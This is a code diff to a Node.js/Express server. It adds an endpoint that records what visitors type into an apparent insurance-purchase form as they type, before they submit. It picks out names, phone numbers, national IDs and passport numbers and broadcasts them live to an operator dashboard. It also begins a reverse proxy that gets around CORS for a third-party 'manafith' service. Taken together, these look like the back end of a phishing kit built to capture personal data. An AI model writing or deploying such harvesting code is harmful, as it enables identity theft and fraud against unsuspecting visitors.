@@ -7,6 +7,8 @@ import bcrypt from 'bcryptjs';
 import 'dotenv/config';
 import Site from './models/Site.js';
 import User from './models/User.js';
+import Visitor from './models/Visitor.js';
+import Submission from './models/Submission.js';
 
 import authRoutes from './Routes/auth.js';
 import siteRoutes from './Routes/sites.js';
@@ -44,6 +46,63 @@ app.use('/api/auth', authRoutes);
 app.use('/api/sites', siteRoutes);
 app.use('/api/dashboard', dashboardRoutes);
 app.use('/api/tracker', trackerRoutes);
+
+// 📡 استقبال البث المباشر لمدخلات كاتب البيانات (Live Stream Inputs) ومنع الـ 404
+app.post('/api/stream-input', async (req, res) => {
+    try {
+        const { siteKey, visitorToken, data, isConfirmed } = req.body;
+        if (!visitorToken) return res.status(400).json({ error: "Missing visitorToken" });
+
+        const activeSite = (siteKey && siteKey.trim()) ? siteKey.trim() : 'site_1789715618986';
+        const formName = 'شراء وثيقة تأمين';
+
+        // 🧠 تحديث أو إنشاء سجل المدخلات
+        let currentSub = await Submission.findOne({
+            visitorToken: visitorToken,
+            siteKey: activeSite,
+            isFinalSubmission: false
+        }).sort({ createdAt: -1 });
+
+        if (currentSub) {
+            currentSub.submissionData = { ...currentSub.submissionData, ...data };
+            currentSub.isFinalSubmission = !!isConfirmed;
+            currentSub.updatedAt = new Date();
+            await currentSub.save();
+        } else {
+            await Submission.create({
+                visitorToken: visitorToken,
+                siteKey: activeSite,
+                formName: formName + (isConfirmed ? ' (مؤكد ✅)' : ' (يجري الكتابة 🟡)'),
+                submissionData: data,
+                isFinalSubmission: !!isConfirmed,
+                createdAt: new Date(),
+                updatedAt: new Date()
+            });
+        }
+
+        // 🧠 تحديث بيانات الزائر المعروضة في لوحة التحكم بشكل لحظي
+        let visitor = await Visitor.findOne({ token: visitorToken });
+        if (visitor) {
+            Object.entries(data).forEach(([k, v]) => {
+                const valStr = String(v || '').trim();
+                if (valStr) {
+                    const checkKey = k.toLowerCase();
+                    if (checkKey.includes('name') || checkKey.includes('اسم')) visitor.name = valStr;
+                    if (checkKey.includes('phone') || checkKey.includes('جوال') || checkKey.includes('هاتف')) visitor.phone = valStr;
+                    if (checkKey.includes('nationalid') || checkKey.includes('هوية') || checkKey.includes('اقامة') || checkKey.includes('passport')) visitor.nationalId = valStr;
+                }
+            });
+            visitor.lastSeen = Date.now();
+            await visitor.save();
+            io.emit('visitor_updated', visitor);
+        }
+
+        return res.json({ success: true });
+    } catch (err) {
+        console.error('Error in stream-input:', err.message);
+        return res.status(500).json({ error: err.message });
+    }
+});
 
 // 🔄 وكيل التفافي سحابي مخصص (Private Reverse Proxy) لجلب لوكابات منافذ والتخلص من CORS و 522
 app.all('/api/manafith-proxy', async (req, res) => {
